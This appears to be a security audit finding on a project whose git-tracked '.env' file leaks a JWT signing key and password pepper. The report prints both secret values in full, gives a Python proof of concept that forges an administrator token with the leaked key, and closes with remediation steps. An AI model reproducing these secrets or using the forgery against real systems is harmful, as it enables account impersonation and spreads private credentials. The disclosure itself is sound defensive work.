# Detailed Security Findings

## Finding: Production JWT Secret and Password Pepper Committed in Git-Tracked `.env`

- **Fingerprint**: `sec-secrets-env-git-tracked`
- **Verdict**: `confirmed`
- **Severity**: **HIGH** (Likelihood: High, Impact: High)
- **Confidence**: **HIGH**

---

### 1. Description & Vulnerability Summary
The application configuration module (`configuration/settings.py`) loads environmental settings from `BASE_DIR / ".secrets" / ".env"`. While `.secrets/` was added to `.gitignore`, Git's index retains files that were committed before the ignore rule was enacted. As a result, `.secrets/.env` remains tracked in the repository, exposing the active `JWT_SECRET_KEY`, `PASSWORD_PEPPER`, and database credentials to anyone with read access to the codebase.

---

### 2. Repository-Relative Trace
1. **Entrypoint**: [.gitignore](file:///d:/uas_praktikum_sad/uas_final/sub/.gitignore#L26)
   - `.secrets/` is listed in `.gitignore`, creating the false impression that secret files in this folder are omitted from version control.
2. **Propagation**: [configuration/settings.py](file:///d:/uas_praktikum_sad/uas_final/sub/configuration/settings.py#L22)
   - `SettingsConfigDict` defines `env_file=BASE_DIR / ".secrets" / ".env"`.
3. **Sink**: [.secrets/.env](file:///d:/uas_praktikum_sad/uas_final/sub/.secrets/.env#L12-L13)
   - Plaintext production-grade secrets are stored directly in the tracked file:
     ```dotenv
     JWT_SECRET_KEY=CHANiLj-uogPpf2MYpgCd-CQzKk9kDqS3J6LURSvPekgg9R3ZMQThiF-FyHZ1COgtnSRlIxsFubtbYAF5XHWor8tyEQ
     PASSWORD_PEPPER=hD22R8u2jRd8RTh9z0Bgczy1Gb4CITPiR9UvGtOYiRDIKTR7k1r5GnNqcwmhj8UNbzn3-iZNbFlPtNJgic4kDw
     ```

---

### 3. Concrete Reproduction
- **Attacker Perspective**: An unprivileged collaborator, auditor, CI runner, or external developer with read access to the Git repository.
- **Payload / Command**:
  ```powershell
  git ls-files .secrets
  ```
- **Instructions**:
  1. Inspect tracked files under the `.secrets/` directory.
  2. Open `.secrets/.env` and retrieve `JWT_SECRET_KEY` and `PASSWORD_PEPPER`.
  3. Generate an arbitrary valid JWT bearer token targeting administrator `user_id`:
     ```python
     import jwt, uuid, datetime
     payload = {
         "sub": "69c3f52b-6b21-4314-9e50-cd771c0074e2",
         "iss": "uas-sad-ebook",
         "aud": "uas-sad-ebook-clients",
         "iat": datetime.datetime.now(datetime.timezone.utc),
         "nbf": datetime.datetime.now(datetime.timezone.utc),
         "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1),
         "jti": uuid.uuid4().hex
     }
     token = jwt.encode(payload, "CHANiLj-uogPpf2MYpgCd-CQzKk9kDqS3J6LURSvPekgg9R3ZMQThiF-FyHZ1COgtnSRlIxsFubtbYAF5XHWor8tyEQ", algorithm="HS256")
     print("Forged Token:", token)
     ```
- **Observed Result**:
  The forged token satisfies `decode_access_token()` in `configuration/authentication.py`, allowing the bearer to impersonate the target account.

---

### 4. Conditions & Invariants
- **Security Invariant**: Cryptographic signing secrets and pepper keys must remain confidential to the execution environment and never be stored in version control.
- **Preconditions**: Attacker has access to repository history or a git clone.

---

### 5. Remediation & Regression Test
1. **Untrack from Git Cache**:
   ```powershell
   git rm --cached .secrets/.env
   git rm --cached .secrets/requirements.txt
   git commit -m "fix(security): untrack secrets directory from git"
   ```
2. **Rotate Secrets**:
   Generate new secrets using `python -c "import secrets; print(secrets.token_urlsafe(64))"` and update production environment variables.
3. **Regression Check**:
   Run `git ls-files .secrets` and assert that no files are returned.
